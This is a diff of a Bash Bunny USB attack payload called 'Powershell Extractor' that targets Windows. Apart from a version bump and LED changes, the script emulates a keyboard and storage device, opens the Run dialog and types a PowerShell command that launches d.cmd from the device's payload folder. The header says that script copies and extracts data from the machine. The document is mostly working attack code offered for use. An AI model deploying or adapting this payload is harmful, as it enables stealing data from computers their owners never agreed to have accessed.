@@ -2,20 +2,20 @@
 #
 # Title:         Powershell Extractor
 # Author:        $irLurk$alot
-# Version:       1.0
+# Version:       1.1
 # Target:        Windows
-# 
+# BashBunnyVer:	 1.1_228
 # Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
 # which in turn runs powershell script to copy move and extract data.
 
 # Source bunny_helpers.sh to get environment variable SWITCH_POSITION
 source bunny_helpers.sh
 
-LED R 100
+LED R VERYFAST
 ATTACKMODE HID STORAGE
 QUACK GUI r
 QUACK DELAY 100
-LED R B 100
+LED M FAST
 QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
 QUACK ENTER
-LED R G B
+LED W SOLID
